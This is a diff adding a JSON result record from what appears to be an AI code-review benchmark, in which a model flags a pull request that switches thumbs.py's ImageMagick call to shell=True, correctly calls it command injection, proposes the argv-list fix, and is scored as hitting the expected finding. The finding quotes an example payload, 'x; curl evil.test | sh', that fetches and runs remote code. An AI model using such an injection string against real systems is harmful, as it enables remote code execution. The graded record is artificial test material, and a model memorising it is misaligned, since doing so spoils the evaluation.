@@ -1,0 +1,51 @@
+{
+  "case": "C005",
+  "pr": "C005",
+  "repo": "fixture",
+  "provider": "grok",
+  "api_base": "",
+  "model": "grok-4.5",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "426aa0eb574d",
+  "turns": 3,
+  "tool_calls": null,
+  "seconds": 33.4,
+  "setup_seconds": 0.0,
+  "total_seconds": 33.5,
+  "usage": {
+    "in": 28656,
+    "cache_read": 54912,
+    "cache_write": 0,
+    "out": 1631,
+    "source": "cli"
+  },
+  "cost_usd": 0.0835716,
+  "changed_files": [
+    "thumbs.py"
+  ],
+  "findings": [
+    {
+      "path": "thumbs.py",
+      "line": 7,
+      "severity": "critical",
+      "body": "**Command injection / RCE:** `subprocess.run(..., shell=True)` builds the command with an f-string that interpolates `upload_dir`, `name`, and `oid` with no escaping. A crafted `name` such as `x; curl evil.test | sh` (or metacharacters in `upload_dir` / `oid`) is executed by the shell as the service user.\n\nImageMagick policy/delegates do **not** require a shell \u2014 keep the argv-list form (and prefer IM7\u2019s `magick` binary if needed):\n\n```suggestion\n    subprocess.run(\n        [\"/usr/bin/magick\", f\"{upload_dir}/{name}\", f\"/srv/thumbs/{oid}.png\"],\n        check=True,\n    )\n```\n\nIf paths can contain spaces, still use the list form (no shell); do not reintroduce `shell=True`."
+    }
+  ],
+  "summary": "## Verdict\n\nCritical security regression \u2014 do not merge. This PR converts a safe argv-list `subprocess.run` into `shell=True` with unescaped interpolation of `upload_dir`, `name`, and `oid`, which is command injection on any attacker-influenced filename or path segment.\n\n## Findings\n\n| # | Severity | File | Summary |\n|---|----------|------|---------|\n| 1 | \ud83d\udea8 critical | `thumbs.py:6` | `shell=True` + f-string interpolates path/name/oid \u2192 shell injection / RCE |\n\n## Notes\n\nThe stated rationale (\u201cshell form needed for the imagemagick policy delegate\u201d) does not hold: ImageMagick policy/delegates apply to the `convert`/`magick` binary whether it is started via argv list or a shell. IM7\u2019s migration path is the `magick` frontend with an argv list (e.g. `[\"/usr/bin/magick\", input, output]`), still `shell=False`.\n\nThe previous comment that `name` is validated upstream by `ALLOWED_FILES` was removed; even with that regex, `upload_dir` and `oid` remain interpolated and any gap in validation becomes full shell RCE.\n\n**Recommendation:** request-changes\n",
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C005-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 1,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
